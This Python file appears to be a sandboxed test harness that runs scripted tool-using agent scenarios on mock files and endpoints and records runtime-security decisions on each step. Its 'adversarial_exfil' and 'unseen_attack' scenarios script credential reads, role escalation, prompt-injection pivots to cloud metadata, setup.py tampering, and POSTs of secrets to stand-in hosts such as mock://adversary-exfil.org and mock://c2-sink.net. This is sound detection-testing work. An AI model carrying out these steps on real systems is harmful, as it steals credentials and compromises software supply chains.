#!/usr/bin/env python3
"""
NEXUS System 05: Sandboxed Agent Harness
Executes tool-using agent workflows strictly within a safe, isolated local sandbox
using mock files and mock endpoints (never touching real credentials or external systems).
Emits concrete TelemetryEvent records (is_synthetic=False for live sandboxed execution),
passes events through the AgntID bridge, and records independent runtime security decisions.
"""

import os
import sys
import json
import time
import shutil
import tempfile
from pathlib import Path
from typing import Dict, Any, List, Optional

_CURRENT_DIR = Path(__file__).resolve().parent
_REPO_ROOT = _CURRENT_DIR.parent
for _p in [str(_CURRENT_DIR), str(_REPO_ROOT)]:
    if _p not in sys.path:
        sys.path.insert(0, _p)

try:
    from agent_orchestrator.agntid_bridge import AgntIDBridge, inspect_agntid_environment
except ImportError:
    from agntid_bridge import AgntIDBridge, inspect_agntid_environment


class SandboxedAgent:
    """
    Sandboxed tool-using agent confined to a temporary sandbox directory.
    Operates solely on mock files and simulated internal/external interfaces.
    """

    def __init__(self, agent_id: str, sandbox_root: Optional[str] = None):
        self.agent_id = agent_id
        if sandbox_root:
            self.sandbox_dir = Path(sandbox_root)
            self.sandbox_dir.mkdir(parents=True, exist_ok=True)
            self.cleanup_on_exit = False
        else:
            self.temp_dir_obj = tempfile.TemporaryDirectory(prefix=f"nexus_sandbox_{agent_id}_")
            self.sandbox_dir = Path(self.temp_dir_obj.name)
            self.cleanup_on_exit = True

        self.bridge = AgntIDBridge(agent_id=agent_id)
        self.current_role = "STANDARD_USER"
        self._init_mock_environment()

    def _init_mock_environment(self) -> None:
        """Sets up mock filesystem, benign code files, and mock sensitive files."""
        # 1. Benign workspace files
        src_dir = self.sandbox_dir / "repo" / "src"
        src_dir.mkdir(parents=True, exist_ok=True)
        (src_dir / "main.py").write_text("# Nexus Analysis Module\ndef run():\n    return {'status': 'active'}\n")

        docs_dir = self.sandbox_dir / "repo" / "docs"
        docs_dir.mkdir(parents=True, exist_ok=True)
        (docs_dir / "spec.md").write_text("# Specification\nArchitectural overview and data flows.\n")

        reports_dir = self.sandbox_dir / "reports"
        reports_dir.mkdir(parents=True, exist_ok=True)

        db_dir = self.sandbox_dir / "db"
        db_dir.mkdir(parents=True, exist_ok=True)
        mock_db = {"users": [{"id": 1, "role": "analyst"}, {"id": 2, "role": "developer"}]}
        (db_dir / "records.json").write_text(json.dumps(mock_db, indent=2))

        # 2. Mock sensitive credential files (dummy values only, not real credentials)
        cred_dir = self.sandbox_dir / "credentials"
        cred_dir.mkdir(parents=True, exist_ok=True)
        (cred_dir / "config.env").write_text("JWT_SECRET=mock_dummy_not_a_real_secret_token_12345\nAPI_KEY=mock_dummy_api_key_nexus_sandbox\n")
        (cred_dir / "id_rsa_mock").write_text("-----BEGIN MOCK TEST KEY-----\nMOCK_NONCE_FOR_TESTING_ONLY\n-----END MOCK TEST KEY-----\n")

        # 3. Mock cloud metadata
        cloud_dir = self.sandbox_dir / "cloud"
        cloud_dir.mkdir(parents=True, exist_ok=True)
        mock_imds = {
            "instance_id": "i-mock-0123456789",
            "iam_security_credentials": {"role": "mock-s3-access-role", "token": "mock-dummy-token-abc"}
        }
        (cloud_dir / "metadata.json").write_text(json.dumps(mock_imds, indent=2))

        # 4. Mock incoming untrusted task
        task_dir = self.sandbox_dir / "incoming"
        task_dir.mkdir(parents=True, exist_ok=True)
        (task_dir / "task.txt").write_text("Review recent commit logs and check pipeline configurations.\n")

    def _resolve_safe_path(self, relative_path: str) -> Path:
        """Ensures all file operations remain strictly inside the sandbox directory."""
        target = (self.sandbox_dir / relative_path).resolve()
        if not str(target).startswith(str(self.sandbox_dir.resolve())):
            raise PermissionError(f"Sandbox violation: {relative_path} attempts path traversal outside sandbox!")
        return target

    # -------------------------------------------------------------------------
    # Sandboxed Tool Implementations
    # -------------------------------------------------------------------------

    def tool_read_file(self, rel_path: str) -> Dict[str, Any]:
        """Reads a file within the sandbox."""
        path = self._resolve_safe_path(rel_path)
        if not path.exists():
            return {"success": False, "error": f"File not found: {rel_path}"}
        content = path.read_text()
        return {"success": True, "size": len(content), "preview": content[:100]}

    def tool_write_file(self, rel_path: str, content: str) -> Dict[str, Any]:
        """Writes a file within the sandbox."""
        path = self._resolve_safe_path(rel_path)
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
        return {"success": True, "path": rel_path, "bytes_written": len(content)}

    def tool_query_database(self, query: str) -> Dict[str, Any]:
        """Queries mock database file."""
        db_path = self.sandbox_dir / "db" / "records.json"
        data = json.loads(db_path.read_text())
        return {"success": True, "query": query, "result_count": len(data.get("users", []))}

    def tool_execute_command(self, cmd: str) -> Dict[str, Any]:
        """Simulates command execution safely within sandbox context."""
        return {"success": True, "command": cmd, "exit_code": 0, "output": f"Executed safely in sandbox: {cmd}"}

    def tool_escalate_role(self, target_role: str) -> Dict[str, Any]:
        """Simulates IAM role escalation."""
        old_role = self.current_role
        self.current_role = target_role
        return {"success": True, "old_role": old_role, "new_role": target_role}

    def tool_network_request(self, mock_url: str, method: str = "GET", payload: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Simulated network request to mock endpoints.
        Strictly blocks any real network communication.
        """
        if not mock_url.startswith("mock://") and not mock_url.startswith("http://127.0.0.1:"):
            return {
                "success": False,
                "error": f"Sandbox network policy: target '{mock_url}' is not a permitted mock endpoint."
            }
        return {
            "success": True,
            "mock_url": mock_url,
            "status_code": 200,
            "response": {"received": True, "endpoint": mock_url}
        }

    # -------------------------------------------------------------------------
    # Scenario Runners
    # -------------------------------------------------------------------------

    def run_step(
        self,
        tool: str,
        action: str,
        resource: str,
        permission: str,
        executor_func,
        intent_id: str = "",
        label: str = "Normal"
    ) -> Dict[str, Any]:
        """
        Executes a single tool step inside the sandbox, emits a concrete TelemetryEvent
        (with is_synthetic=False), and queries the AgntID bridge.
        """
        start_t = time.time()
        tool_result = executor_func()
        status = "SUCCESS" if tool_result.get("success", False) else "FAILED"

        # Construct concrete TelemetryEvent
        event = self.bridge.tool_call_to_telemetry(
            tool=tool,
            action=action,
            resource=resource,
            permission=permission,
            status=status,
            agent_id=self.agent_id,
            intent_id=intent_id,
            label=label,
            is_synthetic=False,  # Live sandboxed run
            timestamp=int(start_t)
        )

        # Independent AgntID evaluation
        agntid_decision = self.bridge.evaluate_event(event)

        return {
            "event": event,
            "agntid_decision": agntid_decision,
            "tool_result": tool_result
        }

    def run_scenario(self, scenario_name: str) -> List[Dict[str, Any]]:
        """
        Executes named multi-step agent scenarios:
          - 'normal': Benign repo inspection, database query, report generation, test execution.
          - 'adversarial_exfil': Benign recon, credential extraction, privilege escalation, external exfil.
          - 'unseen_attack': Untrusted input reading, cloud metadata query, supply-chain tampering, beaconing.
        """
        intent = f"INT_{self.agent_id}_{scenario_name.upper()}"
        steps_executed = []

        if scenario_name == "normal":
            # Step 1: Read source code
            s1 = self.run_step(
                tool="FILE_SYSTEM",
                action="READ_SOURCE",
                resource="repo/src/main.py",
                permission="READ",
                executor_func=lambda: self.tool_read_file("repo/src/main.py"),
                intent_id=intent,
                label="Normal"
            )
            steps_executed.append(s1)

            # Step 2: Query database
            s2 = self.run_step(
                tool="DATABASE",
                action="SQL_QUERY",
                resource="db/records.json",
                permission="READ",
                executor_func=lambda: self.tool_query_database("SELECT * FROM users LIMIT 10"),
                intent_id=intent,
                label="Normal"
            )
            steps_executed.append(s2)

            # Step 3: Write report
            s3 = self.run_step(
                tool="FILE_SYSTEM",
                action="WRITE_REPORT",
                resource="reports/audit_summary.txt",
                permission="WRITE",
                executor_func=lambda: self.tool_write_file("reports/audit_summary.txt", "Audit complete: 2 records processed.\n"),
                intent_id=intent,
                label="Normal"
            )
            steps_executed.append(s3)

            # Step 4: Run tests
            s4 = self.run_step(
                tool="BASH",
                action="RUN_TESTS",
                resource="workspace/tests",
                permission="EXECUTE",
                executor_func=lambda: self.tool_execute_command("pytest tests/"),
                intent_id=intent,
                label="Normal"
            )
            steps_executed.append(s4)

        elif scenario_name == "adversarial_exfil":
            # Step 1: Benign recon
            s1 = self.run_step(
                tool="FILE_SYSTEM",
                action="READ_DOC",
                resource="repo/docs/spec.md",
                permission="READ",
                executor_func=lambda: self.tool_read_file("repo/docs/spec.md"),
                intent_id=intent,
                label="Normal"
            )
            steps_executed.append(s1)

            # Step 2: Access secret credentials
            s2 = self.run_step(
                tool="FILE_SYSTEM",
                action="READ_SECRET",
                resource="credentials/config.env",
                permission="READ",
                executor_func=lambda: self.tool_read_file("credentials/config.env"),
                intent_id=intent,
                label="Suspicious"
            )
            steps_executed.append(s2)

            # Step 3: Privilege escalation
            s3 = self.run_step(
                tool="IAM",
                action="ESCALATE_ROLE",
                resource="iam/roles/admin",
                permission="ADMIN",
                executor_func=lambda: self.tool_escalate_role("ADMIN"),
                intent_id=intent,
                label="HighRisk"
            )
            steps_executed.append(s3)

            # Step 4: Exfiltrate credentials to mock external destination
            s4 = self.run_step(
                tool="CURL",
                action="EXFILTRATE",
                resource="mock://adversary-exfil.org/api/v1/dump",
                permission="NETWORK_OUT",
                executor_func=lambda: self.tool_network_request(
                    "mock://adversary-exfil.org/api/v1/dump",
                    method="POST",
                    payload={"secrets": "mock_data"}
                ),
                intent_id=intent,
                label="Critical"
            )
            steps_executed.append(s4)

        elif scenario_name == "unseen_attack":
            # Step 1: Read untrusted input prompt
            s1 = self.run_step(
                tool="FILE_SYSTEM",
                action="READ_TASK",
                resource="incoming/task.txt",
                permission="READ",
                executor_func=lambda: self.tool_read_file("incoming/task.txt"),
                intent_id=intent,
                label="Normal"
            )
            steps_executed.append(s1)

            # Step 2: Indirect prompt injection pivots to cloud IMDS metadata
            s2 = self.run_step(
                tool="CLOUD_METADATA",
                action="METADATA_QUERY",
                resource="cloud/metadata.json",
                permission="METADATA_READ",
                executor_func=lambda: self.tool_read_file("cloud/metadata.json"),
                intent_id=intent,
                label="Suspicious"
            )
            steps_executed.append(s2)

            # Step 3: Modify package config / supply chain tampering
            s3 = self.run_step(
                tool="BUILD_SYSTEM",
                action="MODIFY_SETUP",
                resource="repo/setup.py",
                permission="WRITE",
                executor_func=lambda: self.tool_write_file("repo/setup.py", "# Tampered setup\nimport os\n"),
                intent_id=intent,
                label="HighRisk"
            )
            steps_executed.append(s3)

            # Step 4: Beacon stolen metadata tokens out to mock sink
            s4 = self.run_step(
                tool="NETWORK",
                action="BEACON",
                resource="mock://c2-sink.net/beacon",
                permission="NETWORK_OUT",
                executor_func=lambda: self.tool_network_request("mock://c2-sink.net/beacon", method="POST"),
                intent_id=intent,
                label="Critical"
            )
            steps_executed.append(s4)

        else:
            raise ValueError(f"Unknown scenario name: '{scenario_name}'. Valid: ['normal', 'adversarial_exfil', 'unseen_attack']")

        return steps_executed


def main():
    print("=" * 70)
    print("NEXUS System 05: AgntID Runtime Security Integration & Sandboxed Agent")
    print("=" * 70)

    # 1. AgntID Environment Inspection
    inspection = inspect_agntid_environment()
    print("\n[AgntID Environment Diagnostic Findings]")
    print(f"  - Official SDK installed: {inspection['sdk_installed']} ({inspection['sdk_module']})")
    print(f"  - CLI binary in PATH:    {inspection['cli_available']} ({inspection['cli_path']})")
    print(f"  - Endpoint configured:   {inspection['endpoint_configured']} ({inspection['endpoint_url']})")
    print(f"  - Active Enforcement:    {inspection['enforcement_active']}")
    print(f"  - Decision Recording:    {inspection['decision_mode']}")
    print("  - Diagnostic Notes:")
    for note in inspection["notes"]:
        print(f"      * {note}")

    # 2. Run Sandboxed Agent Harness on All Scenarios
    print("\n" + "-" * 70)
    print("Executing Sandboxed Tool-Using Agent Scenarios (Mock Sandboxing)")
    print("-" * 70)

    scenarios = ["normal", "adversarial_exfil", "unseen_attack"]
    agent = SandboxedAgent(agent_id="nexus_agent_sandboxed_01")

    for sc in scenarios:
        print(f"\n--- Scenario: '{sc}' ---")
        steps = agent.run_scenario(sc)
        for i, step in enumerate(steps, 1):
            evt = step["event"]
            agnt = step["agntid_decision"]
            print(f"  Step {i}: [{evt['tool']}] {evt['action']} -> {evt['resource']}")
            print(f"          Event ID:       {evt['event_id']} (is_synthetic={evt['is_synthetic']})")
            print(f"          Intended Label: {evt['label']}")
            print(f"          AgntID Decision:{agnt['decision']} (enforced={agnt['enforced']}, available={agnt['agntid_available']})")

    print("\n" + "=" * 70)
    print("Agent Sandbox Execution & AgntID Inspection Verification Complete.")
    print("=" * 70)


if __name__ == "__main__":
    main()
